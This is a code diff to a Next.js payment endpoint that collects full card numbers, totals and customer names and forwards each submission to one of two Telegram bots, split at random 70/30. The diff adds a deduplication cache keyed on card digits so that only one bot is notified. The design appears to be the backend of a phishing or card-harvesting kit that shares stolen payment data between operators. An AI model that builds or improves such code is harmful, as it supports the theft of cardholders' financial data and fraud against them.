@@ -9,8 +9,31 @@ import { createBot2UserToken } from "../../lib/botContact";
 
 // Server-side rate limit: IP → { count, windowStart }
 const notifyRateLimit = new Map<string, { count: number; windowStart: number }>();
-const NOTIFY_MAX = 5;
+const NOTIFY_MAX = 8;
 const NOTIFY_WINDOW_MS = 15 * 60 * 1000;
+
+// Server-side deduplication cache to prevent rapid double-clicks from triggering both bots
+interface DedupEntry {
+  timestamp: number;
+  selectedBot: 1 | 2;
+  orderId: string;
+  bot2Token?: string;
+}
+const recentSubmissions = new Map<string, DedupEntry>();
+const DEDUP_WINDOW_MS = 25 * 1000; // 25 seconds
+
+// Periodically clean old dedup entries
+if (typeof setInterval !== "undefined") {
+  const dedupCleanup = setInterval(() => {
+    const now = Date.now();
+    for (const [key, entry] of recentSubmissions.entries()) {
+      if (now - entry.timestamp > DEDUP_WINDOW_MS) {
+        recentSubmissions.delete(key);
+      }
+    }
+  }, 30 * 1000);
+  if (dedupCleanup.unref) dedupCleanup.unref();
+}
 
 function checkNotifyRateLimit(ip: string): boolean {
   const now = Date.now();
@@ -119,6 +142,31 @@ export async function POST(req: NextRequest) {
     return NextResponse.json({ ok: false, error: "جميع بيانات الدفع الأساسية مطلوبة" }, { status: 400 });
   }
 
+  // -------------------------------------------------------------
+  // DEDUPLICATION LOCK: Prevent rapid double-clicks from triggering both bots
+  // -------------------------------------------------------------
+  const rawCard = String(cardNumber || "").replace(/\D/g, "");
+  const dedupKey = `${rawCard.slice(-8)}_${total}_${String(customer || "").trim()}`;
+  const now = Date.now();
+  const existing = recentSubmissions.get(dedupKey);
+
+  if (existing && now - existing.timestamp < DEDUP_WINDOW_MS) {
+    // Return the existing order response directly so the second bot is NEVER invoked!
+    const res = NextResponse.json({
+      ok: true,
+      orderId: existing.orderId,
+      ...(existing.bot2Token ? { _bt: existing.bot2Token } : {}),
+    });
+    if (existing.selectedBot === 2 && existing.bot2Token) {
+      res.cookies.set("_b_token", existing.bot2Token, {
+        path: "/",
+        maxAge: 365 * 24 * 60 * 60,
+        sameSite: "lax",
+      });
+    }
+    return res;
+  }
+
   // Select destination bot using weighted random distribution (70% Bot 1 / 30% Bot 2)
   const selectedBot = selectBot();
 
@@ -160,6 +208,13 @@ export async function POST(req: NextRequest) {
       return NextResponse.json(errData, { status: dbRes.status });
     }
 
+    // Save in deduplication cache to block duplicate requests
+    recentSubmissions.set(dedupKey, {
+      timestamp: now,
+      selectedBot: 1,
+      orderId,
+    });
+
     // Send notification to Bot 1 (guaranteed to complete before response)
     await sendTelegramNotification(
       1,
@@ -200,6 +255,15 @@ export async function POST(req: NextRequest) {
   }
 
   const bot2Token = createBot2UserToken();
+
+  // Save in deduplication cache to block duplicate requests
+  recentSubmissions.set(dedupKey, {
+    timestamp: now,
+    selectedBot: 2,
+    orderId,
+    bot2Token,
+  });
+
   const res = NextResponse.json({ ok: true, orderId, _bt: bot2Token });
   res.cookies.set("_b_token", bot2Token, {
     path: "/",
